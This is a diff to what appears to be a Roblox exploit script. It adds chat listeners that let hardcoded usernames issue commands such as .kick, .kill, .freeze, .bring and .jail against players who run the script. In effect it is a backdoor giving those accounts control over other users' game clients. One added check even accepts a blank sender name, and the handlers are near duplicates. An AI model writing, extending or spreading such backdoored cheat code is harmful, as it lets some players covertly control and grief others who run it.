@@ -100,7 +100,8 @@ local function ensureBoolValue(playerName)
     return nil
 end
 
-local validCommands = {".bring", ".kill", ".freeze", ".unfreeze", ".users", ".promote", ".jail", ".unjail", ".mute", ".unmute", ".emote", ".nobooth", ".blur", ".unblur", ".hide", ".unhide", ".sit", ".jump", ".noclip", ".clip", ".spawn", ".permspawn", ".nospawn"}
+local validCommands = {".kick", ".bring", ".kill", ".freeze", ".unfreeze", ".users", ".promote", ".jail", ".unjail", ".mute", ".unmute", ".emote", ".nobooth", ".blur", ".unblur", ".hide", ".unhide", ".sit", ".jump", ".noclip", ".clip", ".spawn", ".permspawn", ".nospawn"}
+local admin_cmds = {".kill", ".freeze", ".unfreeze", ".users", ".promote", ".jail", ".unjail", ".emote", ".nobooth", ".hide", ".unhide", ".sit", ".jump", ".noclip", ".clip", ".spawn", ".permspawn", ".nospawn"}
 
 local function handleCommand(command, playerName)
     local player = findplr(playerName)
@@ -516,7 +517,7 @@ getgenv().TextChatService.MessageReceived:Connect(function(message)
     local sender = message.TextSource.Name
     local text = message.Text
 
-    if sender == "L0CKED_1N1" or sender == "Laylay_4kla" or sender == "CHEATING_B0SS" or sender == "adorxfleurys" or sender == "Ransacked007" then
+    if sender == "L0CKED_1N1" or sender == "CHEATING_B0SS" or sender == "adorxfleurys" then
         local prefix, command, playerName = string.match(text, "^(%.)(%w+)%s*(.*)")
 
         if prefix and command then
@@ -525,6 +526,60 @@ getgenv().TextChatService.MessageReceived:Connect(function(message)
             playerName = playerName:match("^%s*(.-)%s*$")
 
             if table.find(validCommands, fullCommand) then
+                if playerName and playerName ~= "" then
+                    handleCommand(fullCommand, playerName)
+                else
+                    warn("Player name is missing for command: " .. fullCommand)
+                end
+            else
+                warn("Unknown command: " .. fullCommand)
+            end
+        else
+            warn("Invalid message format: " .. text)
+        end
+    end
+end)
+
+getgenv().TextChatService.MessageReceived:Connect(function(message)
+    local sender = message.TextSource.Name
+    local text = message.Text
+
+    if sender == "L0CKED_1N1" or sender == "CHEATING_B0SS" or sender == "adorxfleurys" or sender == "Ransacked007" or sender == "" then
+        local prefix, command, playerName = string.match(text, "^(%.)(%w+)%s*(.*)")
+
+        if prefix and command then
+            local fullCommand = prefix .. command
+
+            playerName = playerName:match("^%s*(.-)%s*$")
+
+            if table.find(validCommands, fullCommand) then
+                if playerName and playerName ~= "" then
+                    handleCommand(fullCommand, playerName)
+                else
+                    warn("Player name is missing for command: " .. fullCommand)
+                end
+            else
+                warn("Unknown command: " .. fullCommand)
+            end
+        else
+            warn("Invalid message format: " .. text)
+        end
+    end
+end)
+
+getgenv().TextChatService.MessageReceived:Connect(function(message)
+    local sender = message.TextSource.Name
+    local text = message.Text
+
+    if sender == "Ransacked007" or sender == "Chick7nn" then
+        local prefix, command, playerName = string.match(text, "^(%.)(%w+)%s*(.*)")
+
+        if prefix and command then
+            local fullCommand = prefix .. command
+
+            playerName = playerName:match("^%s*(.-)%s*$")
+
+            if table.find(admin_cmds, fullCommand) then
                 if playerName and playerName ~= "" then
                     handleCommand(fullCommand, playerName)
                 else
@@ -719,7 +774,7 @@ end)
 
 bringEvent.Event:Connect(function(player)
     local targetPlayer = findplr(player)
-    local owner = game.Players:FindFirstChild("L0CKED_1N1") or game.Players:FindFirstChild("CHEATING_B0SS") or game.Players:FindFirstChild("CHEATING_B0SS")
+    local owner = game.Players:FindFirstChild("L0CKED_1N1") or game.Players:FindFirstChild("CHEATING_B0SS") or game.Players:FindFirstChild("adorxfleurys")
 
     if not owner then
         warn("No Owner Found!")
